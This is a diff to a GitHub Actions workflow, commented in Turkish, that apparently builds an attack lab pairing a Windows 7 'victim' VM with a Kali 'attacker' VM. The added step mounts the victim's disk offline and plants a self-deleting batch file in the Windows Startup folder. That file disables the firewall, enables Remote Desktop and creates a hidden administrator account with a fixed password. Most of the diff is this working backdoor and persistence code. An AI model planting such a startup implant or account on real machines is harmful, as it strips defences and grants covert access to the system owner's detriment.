@@ -36,19 +36,43 @@ jobs:
           fi
           echo "✅ Ganimet Aria2 gücüyle kendi makinemizden şak diye çekildi!"
           
-      - name: 3. Windows 7'yi (Kurban) Ateşle
+      - name: 3. Kurbana Çip Tak (Offline Disk Enjeksiyonu)
         run: |
-          sudo qemu-system-x86_64 \
-            -m 2G \
-            -cpu max \
-            -smp 2 \
-            -vga std \
-            -usb -device usb-tablet \
-            -display vnc=:1 \
-            -drive file=kurban_disk.qcow2,format=qcow2 \
-            -boot c \
-            -net nic,model=virtio \
-            -net user,hostfwd=tcp::4445-:445 &
+          echo "Siber cerrahi başlıyor. Disk masaya yatırıldı..."
+          sudo apt-get install qemu-utils ntfs-3g -y -qq
+          
+          # Diski sanal bir donanım olarak sisteme bağlıyoruz
+          sudo modprobe nbd max_part=8
+          sudo qemu-nbd -c /dev/nbd0 kurban_disk.qcow2
+          sleep 3
+          
+          # Windows'un C: diskini mount ediyoruz (Win7'de genelde p2'dir, olmazsa p1 dener)
+          sudo mkdir -p /mnt/win
+          sudo mount -t ntfs-3g /dev/nbd0p2 /mnt/win || sudo mount -t ntfs-3g /dev/nbd0p1 /mnt/win
+          
+          # Başlangıç (Startup) klasörüne oto-ajan scriptimizi yerleştiriyoruz!
+          AUTO_RUN="/mnt/win/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup/siber_ayar.bat"
+          sudo bash -c "cat > '$AUTO_RUN'" << 'EOF'
+          @echo off
+          :: Güvenlik duvarını yerle bir et
+          netsh advfirewall set allprofiles state off
+          
+          :: RDP (Uzak Masaüstü) bağlantılarına izin ver
+          reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+          net start termservice
+          
+          :: Sana özel tam yetkili hesap oluştur (RDP için şifre şarttır)
+          net user Kral kral123 /add
+          net localgroup Administrators Kral /add
+          
+          :: İzi kaybettir (Script kendini silsin)
+          del "%~f0"
+          EOF
+          
+          # Müdahale bitti, hastayı kapatıyoruz
+          sudo umount /mnt/win
+          sudo qemu-nbd -d /dev/nbd0
+          echo "✅ Çip başarıyla yerleştirildi! Win7 uyanır uyanmaz kalkanları kendi kendine indirecek."
           
       - name: 4. Kali Linux'u (Saldırgan) Kur ve SSH'ı Hazırla
         run: |
